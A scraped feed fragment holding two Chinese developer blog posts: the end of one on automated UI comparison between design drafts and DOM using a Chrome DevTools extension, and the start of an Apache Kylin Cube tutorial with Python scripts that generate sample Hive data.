<li>在所有有效匹配中选择距离最小的作为最终匹配结果</li>
</ul>
<h4 data-id="heading-24">算法流程</h4>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1825ae8df6c248d8a7fc18e36e43471d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=8iiyDxXLoUT4CRusMylVRsBMby4%3D" alt="匹配算法流程" loading="lazy"/></p>
<h3 data-id="heading-25">部分区域UI比对逻辑</h3>
<p>上述的比对逻辑虽是比较通用的逻辑，但是在初版实现时，以全页面的比对逻辑为主。但是在实际业务开发过程中，对页面部分区域进行修改的需求数量是多余构建全新页面的需求数量的。因此部分区域比对逻辑是比较关键的一环。</p>
<p>这部分开发的重点在于如何快速简单地让用户选中需要比对的区域？</p>
<p>可以通过chrome插件中的<strong>devtools</strong>相关功能来实现。</p>
<h4 data-id="heading-26">chrome插件通信时序图</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as 👤 用户
    participant DevTools as 🔧 DevTools Panel
    participant BG as 🎯 Background Script
    participant CS as 📄 Content Script
    participant Page as 🌐 被检查页面

    Note over DevTools,BG: 1. 初始化阶段
    User-&gt;&gt;DevTools: 打开 DevTools 面板
    DevTools-&gt;&gt;BG: connect({ name: 'UI_DIFF_PANEL' })
    activate BG
    BG--&gt;&gt;DevTools: Port 连接成功
    DevTools-&gt;&gt;BG: PORT_REGISTER&lt;br/&gt;{ tabId: 123 }
    Note right of BG: 存储 DevTools Port&lt;br/&gt;portMap[123] = port
    BG--&gt;&gt;DevTools: 注册成功
    deactivate BG

    Note over CS,BG: 2. Content Script 准备
    User-&gt;&gt;Page: 打开/刷新页面
    CS-&gt;&gt;CS: 初始化 UI Diff 功能
    
    Note over User,Page: 3. 用户选择元素
    User-&gt;&gt;DevTools: 在 Elements 面板&lt;br/&gt;点击选中元素
    Note right of DevTools: 元素被赋值给 $0
    
    Note over CS,Page: 4. 获取选中元素流程
    CS-&gt;&gt;BG: 发送消息&lt;br/&gt;GET_ELEMENT_SELECTOR&lt;br/&gt;{ tabId: 123 }
    activate BG
    BG-&gt;&gt;BG: 查找对应的 DevTools Port&lt;br/&gt;portMap[123]
    BG-&gt;&gt;DevTools: 转发消息&lt;br/&gt;GET_ELEMENT_SELECTOR
    deactivate BG
    
    activate DevTools
    DevTools-&gt;&gt;Page: inspectedWindow.eval(&lt;br/&gt;getElementSelector($0)&lt;br/&gt;)
    activate Page
    Page-&gt;&gt;Page: 遍历 DOM 树&lt;br/&gt;构建 CSS Selector
    Page--&gt;&gt;DevTools: 返回 Selector 字符串&lt;br/&gt;"#app &gt; div.container"
    deactivate Page
    
    DevTools-&gt;&gt;BG: RETURN_ELEMENT_SELECTOR&lt;br/&gt;{ tabId, selector }
    deactivate DevTools
    
    activate BG
    BG-&gt;&gt;BG: 查找对应的标签页
    BG-&gt;&gt;CS: chrome.tabs.sendMessage&lt;br/&gt;{ selector: "..." }
    deactivate BG
    
    activate CS
    CS-&gt;&gt;CS: 使用 Selector 定位元素&lt;br/&gt;document.querySelector(selector)
    CS-&gt;&gt;Page: getBoundingClientRect()
    Page--&gt;&gt;CS: { x, y, width, height }
    CS-&gt;&gt;CS: 执行 UI Diff 对比逻辑
    deactivate CS

    Note over User,Page: 5. 完成对比
    CS--&gt;&gt;User: 显示对比结果
</code></pre>
<h4 data-id="heading-27">获取用户当前在element标签下选中的元素</h4>
<p>主要通过chrome插件的<a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.chrome.com%2Fdocs%2Fextensions%2Freference%2Fapi%2Fdevtools%2FinspectedWindow%3Fhl%3Dzh-cn%23method-eval" target="_blank" title="https://developer.chrome.com/docs/extensions/reference/api/devtools/inspectedWindow?hl=zh-cn#method-eval" ref="nofollow noopener noreferrer"><code>chrome.devtools.inspectedWindow.eval</code></a>方法实现。</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleGetSelectedElement</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> getSelectorExpression = <span class="hljs-string">`
      (function() {
      	// ...生成selector逻辑
        // $0 是 DevTools 中当前选中的元素
        return getElementSelector($0);
      })()
    `</span>
  <span class="hljs-comment">// 使用 chrome.devtools.inspectedWindow.eval 在页面上下文中执行</span>
  chrome.<span class="hljs-property">devtools</span>.<span class="hljs-property">inspectedWindow</span>.<span class="hljs-built_in">eval</span>(
    getSelectorExpression,
    <span class="hljs-function">(<span class="hljs-params">result, exceptionInfo</span>) =&gt;</span> {
      <span class="hljs-comment">// 将获取到的selector发送给background</span>
      <span class="hljs-keyword">const</span> <span class="hljs-attr">responseMsg</span>: <span class="hljs-title class_">ChromeListenerMessageType</span> = {
        <span class="hljs-attr">type</span>: <span class="hljs-title class_">ChromeMessageType</span>.<span class="hljs-property">RETURN_ELEMENT_SELECTOR</span>,
        <span class="hljs-attr">data</span>: {
          <span class="hljs-attr">tabId</span>: chrome.<span class="hljs-property">devtools</span>.<span class="hljs-property">inspectedWindow</span>.<span class="hljs-property">tabId</span>,
          <span class="hljs-attr">selector</span>: result,
        },
      }
      backgroundPort?.<span class="hljs-title function_">postMessage</span>(responseMsg)
    },
  )
}
</code></pre>
<h4 data-id="heading-28">生成对应节点的selector逻辑</h4>
<p>通过生成对应节点的selector，将结果经由background层发送给<code>content_script</code>(插件主体)，在<code>content_script</code>中通过<code>document.querySelector(${selector})</code>重新获取到用户选中的节点。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getElementSelector</span>(<span class="hljs-params">element</span>) {
  <span class="hljs-keyword">if</span> (!element) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
  }

  <span class="hljs-comment">// 如果是 document，返回 html</span>
  <span class="hljs-keyword">if</span> (element === <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'html'</span>
  }

  <span class="hljs-comment">// 如果元素有 id，使用 id</span>
  <span class="hljs-keyword">if</span> (element.<span class="hljs-property">id</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`#<span class="hljs-subst">${element.id}</span>`</span>
  }

  <span class="hljs-comment">// 构建 CSS Selector</span>
  <span class="hljs-keyword">const</span> path = []
  <span class="hljs-keyword">let</span> current = element

  <span class="hljs-keyword">while</span> (current &amp;&amp; current.<span class="hljs-property">nodeType</span> === <span class="hljs-title class_">Node</span>.<span class="hljs-property">ELEMENT_NODE</span>) {
    <span class="hljs-keyword">let</span> selector = current.<span class="hljs-property">nodeName</span>.<span class="hljs-title function_">toLowerCase</span>()

    <span class="hljs-comment">// 添加类名（如果有）</span>
    <span class="hljs-keyword">if</span> (current.<span class="hljs-property">className</span> &amp;&amp; <span class="hljs-keyword">typeof</span> current.<span class="hljs-property">className</span> === <span class="hljs-string">'string'</span>) {
      <span class="hljs-keyword">const</span> classes = current.<span class="hljs-property">className</span>.<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">split</span>(<span class="hljs-regexp">/\\s+/</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c)
      <span class="hljs-keyword">if</span> (classes.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
        selector += <span class="hljs-string">`.<span class="hljs-subst">${classes.join(<span class="hljs-string">'.'</span>)}</span>`</span>
      }
    }

    <span class="hljs-comment">// 计算同级元素的位置（如果需要）</span>
    <span class="hljs-keyword">if</span> (current.<span class="hljs-property">parentNode</span>) {
      <span class="hljs-keyword">const</span> siblings = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(current.<span class="hljs-property">parentNode</span>.<span class="hljs-property">children</span>).<span class="hljs-title function_">filter</span>(
        <span class="hljs-function"><span class="hljs-params">sibling</span> =&gt;</span> sibling.<span class="hljs-property">nodeName</span> === current.<span class="hljs-property">nodeName</span>,
      )

      <span class="hljs-keyword">if</span> (siblings.<span class="hljs-property">length</span> &gt; <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">const</span> index = siblings.<span class="hljs-title function_">indexOf</span>(current) + <span class="hljs-number">1</span>
        selector += <span class="hljs-string">`:nth-of-type(<span class="hljs-subst">${index}</span>)`</span>
      }
    }

    path.<span class="hljs-title function_">unshift</span>(selector)
    current = current.<span class="hljs-property">parentNode</span>

    <span class="hljs-comment">// 如果到达了有 id 的父元素，可以停止</span>
    <span class="hljs-keyword">if</span> (current &amp;&amp; current.<span class="hljs-property">id</span>) {
      path.<span class="hljs-title function_">unshift</span>(<span class="hljs-string">`#<span class="hljs-subst">${current.id}</span>`</span>)
      <span class="hljs-keyword">break</span>
    }
  }

  <span class="hljs-keyword">return</span> path.<span class="hljs-title function_">join</span>(<span class="hljs-string">' &gt; '</span>)
}
</code></pre>
<h3 data-id="heading-29">写在最后</h3>
<p>这套方案从最初的想法到现在的实现,其实走了不少弯路。最开始我们也想过用图像识别,毕竟看起来很"AI"很"高级",但实际跑下来发现根本不靠谱——设计稿改个文案、换个颜色,算法就得重新训练。后来才想明白,既然设计稿和DOM都是结构化数据,为什么不直接对比结构呢?</p>
<p>整个方案的核心其实就做了一件事:把两个看起来完全不同的东西(设计稿的JSON和HTML的DOM树),通过一系列归一化处理,变成可以直接比对的同构数据。这个过程中最大的感受是,<strong>前端开发和UI设计之间的gap,本质上是两套不同的渲染规则在互相较劲</strong>。CSS的margin折叠、行高计算、盒模型,每一个细节都可能让设计稿"看起来一样"的两个元素在代码层面完全不同。</p>
<p>说实话,当前40%-60%的匹配准确率还远谈不上完美,但至少让我们看到了一个方向:自动化UI走查的关键不在于追求百分百的准确,而在于建立一套可量化、可追溯的比对标准。就像单元测试不能保证代码零bug,但能让我们对代码质量有个基本的信心。</p>
<p>更重要的是,这套方案让我们重新思考了前端工程化的本质。过去我们总说要提效、要自动化,但往往只盯着代码构建、打包部署这些环节。UI还原度这件事一直是个"玄学"——全凭开发的经验和责任心。现在我们把它量化了、标准化了,这意味着整个研发流程可以往前再推一步:不仅要保证代码能跑,还要保证UI能过。</p>
<p>当然,技术方案永远只是工具。真正能提升团队协作效率的,是大家对质量的共识。这套自动化走查如果只是用来"抓bug",那价值就太有限了。我更希望它能成为一面镜子,让前端看到自己对设计的理解偏差,让设计看到自己稿子的不规范之处,最终推动双方在规范上达成更多共识。</p>
<p>技术的意义从来不在于解决所有问题,而在于让问题变得可见、可量化、可改进。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大数据-159 Apache Kylin Cube 实战：Hive 装载与预计算加速（含 Cuboid/实时 OLAP，Kylin 4.x）]]></title>    <link>https://juejin.cn/post/7574657475431432218</link>    <guid>https://juejin.cn/post/7574657475431432218</guid>    <pubDate>2025-11-21T02:35:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574657475431432218" data-draft-id="7574722364354494473" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大数据-159 Apache Kylin Cube 实战：Hive 装载与预计算加速（含 Cuboid/实时 OLAP，Kylin 4.x）"/> <meta itemprop="keywords" content="后端,大数据,Apache Kylin"/> <meta itemprop="datePublished" content="2025-11-21T02:35:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="武子康"/> <meta itemprop="url" content="https://juejin.cn/user/149189314230039"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大数据-159 Apache Kylin Cube 实战：Hive 装载与预计算加速（含 Cuboid/实时 OLAP，Kylin 4.x）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/149189314230039/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    武子康
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T02:35:59.000Z" title="Fri Nov 21 2025 02:35:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">TL;DR</h2>
<ul>
<li>场景：在 h122 节点已启动 Kylin，使用 Hive 装载自造样例数据，演示 Cube 预计算与查询加速。</li>
<li>结论：按星型模型建模并裁剪 Aggregation Group，可显著缩短多维聚合查询时延；实时场景可用 Kylin 4.x + Kafka。</li>
<li>产出：数据脚本+Hive DDL/DML+验证 SQL 与截图；可直接复用到小型 PoC 或团队内训。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34a8ad46b10b4e628962136317652880~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=nGrSG7cqc%2B1NTcqiADFR%2FCeF27E%3D" alt="大数据-159 Apache Kylin Cube 实战：Hive 装载与预计算加速（含 Cuboid/实时 OLAP，Kylin 4.x）" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/691e7be1c9bf46f894a5c69aab2ded62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=6MHsu5w1YH%2BcdzNvUojxeAfxlyk%3D" alt="Apache Kylin" loading="lazy"/></p>
<h2 data-id="heading-1">Cube 介绍</h2>
<p>Apache Kylin 是一个开源的分布式分析引擎，专注于提供大数据的实时OLAP（在线分析处理）能力。Cube（立方体）是 Apache Kylin 的核心概念之一，通过预计算大规模数据的多维数据集合，加速复杂的 SQL 查询。下面详细介绍 Cube 的关键点：</p>
<h3 data-id="heading-2">Cube 的基本概念</h3>
<p>Kylin 中的 Cube 是通过对一组事实表（通常是业务数据表）进行多维建模后，生成的预计算数据结构。Cube 涉及对多维数据的度量和维度的组合，从而可以在查询时通过检索预先计算的结果来显著减少计算开销。</p>
<ul>
<li>维度（Dimension）：数据中用于分组、筛选和切片的数据字段，例如时间、地区、产品等。</li>
<li>度量（Measure）：通常是需要进行聚合计算的数据字段，例如销售额、订单数等。</li>
<li>Cuboid：每个 Cube 由多个 Cuboid 构成，Cuboid 是一个特定维度组合的子集。Cube 中每种维度组合都会生成一个 Cuboid，每个 Cuboid 存储了该组合下的预聚合结果。</li>
</ul>
<h3 data-id="heading-3">Cube 的创建过程</h3>
<ul>
<li>数据建模：首先在 Kylin 中创建一个数据模型（Data Model），这个模型定义了事实表和维度表之间的关系，类似于星型或雪花型模式。模型中也定义了需要聚合的度量字段。</li>
<li>Cube 设计：基于数据模型设计 Cube，指定 Cube 的维度和度量。Kylin 会根据定义自动计算所有可能的维度组合（Cuboid）。</li>
<li>构建 Cube：构建过程会读取底层数据源（如 Hive、HBase、Kafka），然后根据指定的维度和度量生成每个 Cuboid 的预计算数据。这些预计算结果存储在 HBase 或其他存储引擎中。</li>
</ul>
<h3 data-id="heading-4">Cube 的查询与优化</h3>
<ul>
<li>查询加速：当有 SQL 查询请求到达时，Kylin 会根据查询所涉及的维度组合，选择合适的 Cuboid 返回结果，避免了实时计算，极大地提高了查询性能。</li>
<li>Cube 优化：为了控制 Cube 大小和加速构建，Kylin 支持裁剪 Cube，通过配置仅生成部分 Cuboid，这称为“Aggregation Group”，可以减少冗余计算。</li>
</ul>
<h3 data-id="heading-5">实时 OLAP</h3>
<p>Kylin 4.0 引入了对实时 OLAP 的支持，使用 Kafka 作为实时数据流输入，构建实时 Cube。通过使用 Lambda 架构，Kylin 可以支持实时和批处理数据的整合分析。</p>
<h3 data-id="heading-6">Cube 的典型应用场景</h3>
<ul>
<li>大规模数据分析：Cube 适用于分析超大规模的数据集，通过预计算方式加速查询。</li>
<li>实时分析：实时 Cube 允许用户在近乎实时的基础上分析流数据。</li>
<li>商业智能（BI）工具的集成：Kylin 提供与 Tableau、Power BI 等常见 BI 工具的集成，用户可以使用熟悉的 SQL 查询语言进行复杂的多维分析。</li>
</ul>
<h2 data-id="heading-7">前置要求</h2>
<p>需要你配置并且启动好了 Kylin！
由于我是在 h122.wzk.icu 节点上启动的，所以下面的操作都在 h122 节点上，后续没有详细说明就是在该机器上了。</p>
<h2 data-id="heading-8">准备数据</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2123b153c35941bc844a67d28feda502~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=dBsTIkt2OHDvaox04UYSmcdZFa0%3D" alt="整体表结构关系" loading="lazy"/></p>
<h3 data-id="heading-9">准备数据</h3>
<p>将4个数据文件：</p>
<ul>
<li>dw_sales_data.txt</li>
<li>dim_channel_data.txt</li>
<li>dim_product_data.txt</li>
<li>dim_region_data.txt</li>
</ul>
<p>我写了几个脚本来辅助生成数据
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9c42fab4163429f9b29401f71a38abc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=I8JYLmKmxA3SkB%2BI8dwKu0nqQ%2B4%3D" alt="准备python脚本" loading="lazy"/></p>
<h3 data-id="heading-10">dw_sales_data</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> datetime

<span class="hljs-comment"># 设置参数</span>
num_records = <span class="hljs-number">1000</span>
output_file = <span class="hljs-string">'dw_sales_data.txt'</span>

<span class="hljs-comment"># 定义可能的值</span>
channel_ids = [<span class="hljs-string">'C001'</span>, <span class="hljs-string">'C002'</span>, <span class="hljs-string">'C003'</span>, <span class="hljs-string">'C004'</span>]
product_ids = [<span class="hljs-string">'P001'</span>, <span class="hljs-string">'P002'</span>, <span class="hljs-string">'P003'</span>, <span class="hljs-string">'P004'</span>]
region_ids = [<span class="hljs-string">'R001'</span>, <span class="hljs-string">'R002'</span>, <span class="hljs-string">'R003'</span>, <span class="hljs-string">'R004'</span>]
base_date = datetime.date(<span class="hljs-number">2024</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)

<span class="hljs-comment"># 生成数据</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_records):
        record_id = <span class="hljs-string">f"<span class="hljs-subst">{i+<span class="hljs-number">1</span>:04d}</span>"</span>
        date1 = (base_date + datetime.timedelta(days=random.randint(<span class="hljs-number">0</span>, <span class="hljs-number">365</span>))).strftime(<span class="hljs-string">'%Y-%m-%d'</span>)
        channel_id = random.choice(channel_ids)
        product_id = random.choice(product_ids)
        region_id = random.choice(region_ids)
        amount = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>)
        price = <span class="hljs-built_in">round</span>(random.uniform(<span class="hljs-number">10.0</span>, <span class="hljs-number">500.0</span>), <span class="hljs-number">2</span>)
        
        line = <span class="hljs-string">f"<span class="hljs-subst">{record_id}</span>,<span class="hljs-subst">{date1}</span>,<span class="hljs-subst">{channel_id}</span>,<span class="hljs-subst">{product_id}</span>,<span class="hljs-subst">{region_id}</span>,<span class="hljs-subst">{amount}</span>,<span class="hljs-subst">{price}</span>\n"</span>
        f.write(line)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{num_records}</span> records have been written to <span class="hljs-subst">{output_file}</span>"</span>)

</code></pre>
<p>生成数据如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/097402c65a0b438daa675faac81a2996~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=F44O%2BrHZid1fHt965GVBsnF4KZA%3D" alt="生成数据的结果" loading="lazy"/></p>
<h3 data-id="heading-11">dim_channel_data</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 设置参数</span>
output_file = <span class="hljs-string">'dim_channel_data.txt'</span>

<span class="hljs-comment"># 定义渠道ID和渠道名称</span>
channels = [
    (<span class="hljs-string">'C001'</span>, <span class="hljs-string">'Online Sales'</span>),
    (<span class="hljs-string">'C002'</span>, <span class="hljs-string">'Retail Store'</span>),
    (<span class="hljs-string">'C003'</span>, <span class="hljs-string">'Wholesale'</span>),
    (<span class="hljs-string">'C004'</span>, <span class="hljs-string">'Direct Sales'</span>)
]

<span class="hljs-comment"># 生成数据</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> channel_id, channel_name <span class="hljs-keyword">in</span> channels:
        line = <span class="hljs-string">f"<span class="hljs-subst">{channel_id}</span>,<span class="hljs-subst">{channel_name}</span>\n"</span>
        f.write(line)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Channel data has been written to <span class="hljs-subst">{output_file}</span>"</span>)

</code></pre>
<p>生成数据如下图所示：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94a78a85ac4449a8a6c32dd70b1e3b93~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5q2m5a2Q5bq3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297359&amp;x-signature=TejMzjqMCnvWaK54OKK8VJLFfCM%3D" alt="查看生成的数据结构" loading="lazy"/></p>
<h3 data-id="heading-12">dim_product_data</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 设置参数</span>
output_file = <span class="hljs-string">'dim_product_data.txt'</span>

<span class="hljs-comment"># 定义产品ID和产品名称</span>
products = [
    (<span class="hljs-string">'P001'</span>, <span class="hljs-string">'Smartphone'</span>),
    (<span class="hljs-string">'P002'</span>, <span class="hljs-string">'Laptop'</span>),
    (<span class="hljs-string">'P003'</span>, <span class="hljs-string">'Tablet'</span>),
    (<span class="hljs-string">'P004'</span>, <span class="hljs-string">'Smartwatch'</span>),
    (<span class="hljs-string">'P005'</span>, <span class="hljs-string">'Camera'</span>),
    (<span class="hljs-string">'P006'</span>, <span class="hljs-string">'Headphones'</span>),
    (<span class="hljs-string">'P007'</span>, <span class="hljs-string">'Monitor'</span>),
    (<span class="hljs-string">'P008'</span>, <span class="hljs-string">'Keyboard'</span>),
    (<span class="hljs-string">'P009'</span>, <span class="hljs-string">'Mouse'</span>),
    (<span class="hljs-string">'P010'</span>, <span class="hljs-string">'Printer'</span>)
]

<span class="hljs-comment"># 生成数据</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> product_id, product_name <span class="hljs-keyword">in</span> products:
        line = <span class="hljs-string">f"<span class="hljs-subst">{product_id}</span>,<span class="hljs-subst">{product_name}</span>\n"</span>
        f.write(line)

